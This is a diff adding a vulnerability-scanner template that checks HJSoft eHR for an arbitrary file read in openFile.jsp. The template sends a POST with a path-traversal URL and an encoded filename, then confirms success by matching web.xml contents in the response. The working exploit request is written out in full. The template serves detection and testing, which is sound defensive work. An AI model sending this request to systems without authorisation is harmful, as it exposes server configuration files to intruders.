@@ -1,0 +1,25 @@
+id: hjsoft-ehr-openfile-jsp-anyfile-read
+info:
+  name: HJSoft eHR openFile.jsp Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: POST
+    path:
+      - "/templates/attestation/../../general/muster/hmuster/openFile.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      filename=8uHo1M8Ok6bZ468mKmzw70ounZHwKUWnpVOrvOAV6WoPAATTP3HJDPAATTP
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<filter>"
+          - "GzipJsFilter"
+          - "</web-app>"
+        part: body
